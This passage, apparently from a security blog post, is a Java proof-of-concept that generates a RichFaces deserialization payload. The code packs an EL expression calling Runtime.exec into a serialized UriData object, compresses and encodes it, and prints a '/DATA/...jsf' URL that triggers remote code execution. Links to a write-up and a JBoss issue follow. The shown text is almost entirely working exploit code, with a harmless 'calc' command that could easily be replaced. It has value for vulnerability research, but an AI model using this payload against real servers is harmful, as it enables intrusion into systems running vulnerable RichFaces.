<span class="kn">import</span> <span class="nn">org.richfaces.ui.application.StateMethodExpressionWrapper</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.OutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Modifier</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Date</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.zip.Deflater</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.el.MethodExpression</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.faces.context.FacesContext</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>

        <span class="n">String</span> <span class="n">pocEL</span> <span class="o">=</span> <span class="s">"#{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"calc\")}"</span><span class="o">;</span>
        <span class="c1">// tomcat8.5.24 MethodExpression serialVersionUID</span>
        <span class="n">Long</span> <span class="n">MethodExpressionSerialVersionUID</span> <span class="o">=</span> <span class="mi">8163925562047324656L</span><span class="o">;</span>
        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"javax.el.MethodExpression"</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="s">"serialVersionUID"</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">modifiersField</span> <span class="o">=</span> <span class="n">Field</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"modifiers"</span><span class="o">);</span>
        <span class="n">modifiersField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">modifiersField</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="n">field</span><span class="o">,</span> <span class="n">field</span><span class="o">.</span><span class="na">getModifiers</span><span class="o">()</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">Modifier</span><span class="o">.</span><span class="na">FINAL</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setLong</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">MethodExpressionSerialVersionUID</span><span class="o">);</span>




        <span class="c1">// createContent</span>
        <span class="n">MethodExpressionImpl</span> <span class="n">mei</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MethodExpressionImpl</span><span class="o">(</span><span class="n">pocEL</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">OutputStream</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">});</span>
        <span class="n">ValueExpressionImpl</span> <span class="n">vei</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ValueExpressionImpl</span><span class="o">(</span><span class="n">pocEL</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">MethodExpression</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">StateMethodExpressionWrapper</span> <span class="n">smew</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StateMethodExpressionWrapper</span><span class="o">(</span><span class="n">mei</span><span class="o">,</span> <span class="n">vei</span><span class="o">);</span>
        <span class="n">Location</span> <span class="n">location</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Location</span><span class="o">(</span><span class="s">"/richfaces/mediaOutput/examples/jpegSample.xhtml"</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
        <span class="n">TagAttribute</span> <span class="n">tagAttribute</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TagAttribute</span><span class="o">(</span><span class="n">location</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="s">"@11214"</span><span class="o">,</span> <span class="s">"createContent="</span><span class="o">+</span><span class="n">pocEL</span><span class="o">);</span>
        <span class="n">TagMethodExpression</span> <span class="n">tagMethodExpression</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TagMethodExpression</span><span class="o">(</span><span class="n">tagAttribute</span><span class="o">,</span> <span class="n">smew</span><span class="o">);</span>

        <span class="n">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"javax.faces.component.StateHolderSaver"</span><span class="o">);</span>
        <span class="n">Constructor</span> <span class="n">ct</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">FacesContext</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">ct</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">createContnet</span> <span class="o">=</span> <span class="n">ct</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">tagMethodExpression</span><span class="o">);</span>

        <span class="c1">//value</span>
        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="s">"haveTest"</span><span class="o">;</span>

        <span class="c1">//modified</span>
        <span class="n">TagAttribute</span> <span class="n">tag</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TagAttribute</span><span class="o">(</span><span class="n">location</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="s">"just"</span><span class="o">,</span> <span class="s">"modified="</span><span class="o">+</span><span class="n">pocEL</span><span class="o">);</span>
        <span class="n">ValueExpressionImpl</span> <span class="n">ve</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ValueExpressionImpl</span><span class="o">(</span><span class="n">pocEL</span><span class="o">+</span><span class="s">" modified"</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">Date</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">TagValueExpression</span> <span class="n">tagValueExpression</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TagValueExpression</span><span class="o">(</span><span class="n">tag</span><span class="o">,</span> <span class="n">ve</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">modified</span> <span class="o">=</span> <span class="n">ct</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">tagValueExpression</span><span class="o">);</span>

        <span class="c1">//expires</span>
        <span class="n">TagAttribute</span> <span class="n">tag2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TagAttribute</span><span class="o">(</span><span class="n">location</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="s">"have_fun"</span><span class="o">,</span> <span class="s">"expires="</span><span class="o">+</span><span class="n">pocEL</span><span class="o">);</span>
        <span class="n">ValueExpressionImpl</span> <span class="n">ve2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ValueExpressionImpl</span><span class="o">(</span><span class="n">pocEL</span><span class="o">+</span><span class="s">" expires"</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">Date</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">TagValueExpression</span> <span class="n">tagValueExpression2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TagValueExpression</span><span class="o">(</span><span class="n">tag2</span><span class="o">,</span> <span class="n">ve2</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">expires</span> <span class="o">=</span> <span class="n">ct</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">tagValueExpression2</span><span class="o">);</span>

        <span class="c1">//payload object</span>
        <span class="n">UserResource</span><span class="o">.</span><span class="na">UriData</span> <span class="n">uriData</span> <span class="o">=</span> <span class="k">new</span> <span class="n">UserResource</span><span class="o">.</span><span class="na">UriData</span><span class="o">();</span>
        <span class="c1">//Constructor con = UserResource.class.getConstructor(new Class[]{});</span>
        <span class="n">Field</span> <span class="n">fieldCreateContent</span> <span class="o">=</span> <span class="n">uriData</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"createContent"</span><span class="o">);</span>
        <span class="n">fieldCreateContent</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">fieldCreateContent</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">uriData</span><span class="o">,</span> <span class="n">createContnet</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">fieldValue</span> <span class="o">=</span> <span class="n">uriData</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"value"</span><span class="o">);</span>
        <span class="n">fieldValue</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">fieldValue</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">uriData</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">fieldModefied</span> <span class="o">=</span> <span class="n">uriData</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"modified"</span><span class="o">);</span>
        <span class="n">fieldModefied</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">fieldModefied</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">uriData</span><span class="o">,</span> <span class="n">modified</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">fieldExpires</span> <span class="o">=</span> <span class="n">uriData</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"expires"</span><span class="o">);</span>
        <span class="n">fieldExpires</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">fieldExpires</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">uriData</span><span class="o">,</span> <span class="n">expires</span><span class="o">);</span>


        <span class="c1">//encrypt</span>
        <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">);</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">uriData</span><span class="o">);</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">pocData</span> <span class="o">=</span> <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
        <span class="n">Deflater</span> <span class="n">compressor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Deflater</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">compressed</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">pocData</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">100</span><span class="o">];</span>
        <span class="n">compressor</span><span class="o">.</span><span class="na">setInput</span><span class="o">(</span><span class="n">pocData</span><span class="o">);</span>
        <span class="n">compressor</span><span class="o">.</span><span class="na">finish</span><span class="o">();</span>
        <span class="kt">int</span> <span class="n">totalOut</span> <span class="o">=</span> <span class="n">compressor</span><span class="o">.</span><span class="na">deflate</span><span class="o">(</span><span class="n">compressed</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">zipsrc</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">totalOut</span><span class="o">];</span>
        <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">compressed</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">zipsrc</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">totalOut</span><span class="o">);</span>
        <span class="n">compressor</span><span class="o">.</span><span class="na">end</span><span class="o">();</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">dataArray</span> <span class="o">=</span> <span class="n">URL64Codec</span><span class="o">.</span><span class="na">encodeBase64</span><span class="o">(</span><span class="n">zipsrc</span><span class="o">);</span>

        <span class="n">String</span> <span class="n">poc</span> <span class="o">=</span> <span class="s">"/DATA/"</span> <span class="o">+</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">dataArray</span><span class="o">,</span> <span class="s">"ISO-8859-1"</span><span class="o">)</span> <span class="o">+</span> <span class="s">".jsf"</span><span class="o">;</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>Referer:<br/>
<a href="https://www.secpulse.com/archives/75882.html" target="_blank">https://www.secpulse.com/archives/75882.html</a><br/>
<a href="https://issues.jboss.org/browse/RF-13977" target="_blank">https://issues.jboss.org/browse/RF-13977</a></p>
</div>
</div>